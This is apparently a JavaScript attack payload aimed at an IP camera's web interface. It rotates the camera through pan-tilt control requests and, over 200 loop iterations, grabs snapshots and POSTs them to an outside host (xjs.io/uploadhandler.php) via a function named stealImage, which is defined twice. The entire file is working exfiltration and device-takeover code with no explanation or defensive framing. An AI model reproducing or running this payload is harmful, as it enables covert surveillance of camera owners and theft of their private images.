

function httpPost(theUrl, theData)
{
    if (theData !== null) {
        console.log(theData.length)

        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "POST", theUrl );
        xmlHttp.responseType="blob";
        xmlHttp.setRequestHeader("Content-Type", 'image/jpeg');
        xmlHttp.setRequestHeader("Content-Length", theData.length );
        xmlHttp.send(theData);
    }

}

function stealImage(theUrl)
{
    var data = null;

    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, true );

    xmlHttp.responseType="blob";
    xmlHttp.setRequestHeader("Cache-Control", "no-cache" );
    xmlHttp.overrideMimeType('image/jpeg');

    xmlHttp.onreadystatechange = function(e){
        if(xmlHttp.readyState == 4 && xmlHttp.status == 200){
            console.log(xmlHttp.response.length)

            data = xmlHttp.response;

            httpPost('http://xjs.io/uploadhandler.php', data );
        }
    };

    xmlHttp.send(null);

    return data;
}

function stealImage(theUrl)
{
    var data = null;

    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, true );

    xmlHttp.responseType="blob";
    xmlHttp.setRequestHeader("Cache-Control", "no-cache" );
    xmlHttp.overrideMimeType('image/jpeg');

    xmlHttp.onreadystatechange = function(e){
        if(xmlHttp.readyState == 4 && xmlHttp.status == 200){
            console.log(xmlHttp.response.length)

            data = xmlHttp.response;

            httpPost('http://xjs.io/uploadhandler.php', data );
        }
    };

    xmlHttp.send(null);

    return data;
}

function httpGet(theUrl)
{
    var data = null;

    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, true );

    xmlHttp.responseType="blob";
    xmlHttp.setRequestHeader("Cache-Control", "no-cache" );
    xmlHttp.overrideMimeType('image/jpeg');

    xmlHttp.send(null);

    return data;
}

var i;

//rotate
httpGet( document.referrer.split('/')[2] + '/ccm/ccm_ptz_ctl.js?dsess=1&dsess_nid=MGCdk8hSgDOwPmWRlZIwFp9CJvthAQ&dtrans=1&dtrans_pan_tilt=1&dtrans_pan_tilt_x=1000&dtrans_pan_tilt_y=0&dspeed=1&dspeed_pan_tilt=1&dspeed_pan_tilt_x=30&dspeed_pan_tilt_y=40' );


for (i = 0; i < 200 ; i++) {

    // get the image from the camera and post it to us
    stealImage( document.referrer.split('/')[2] +'/ccm/ccm_pic_get.jpg?dsess=1&dsess_nid='+mcloud_account.create_nid()+'&dtoken=p0_xxxxxxxxxx' );

    //rotate
    httpGet( document.referrer.split('/')[2] + '/ccm/ccm_ptz_ctl.js?dsess=1&dsess_nid=MGCdk8hSgDOwPmWRlZIwFp9CJvthAQ&dtrans=1&dtrans_pan_tilt=1&dtrans_pan_tilt_x=-50&dtrans_pan_tilt_y=0&dspeed=1&dspeed_pan_tilt=1&dspeed_pan_tilt_x=30&dspeed_pan_tilt_y=40' );

}


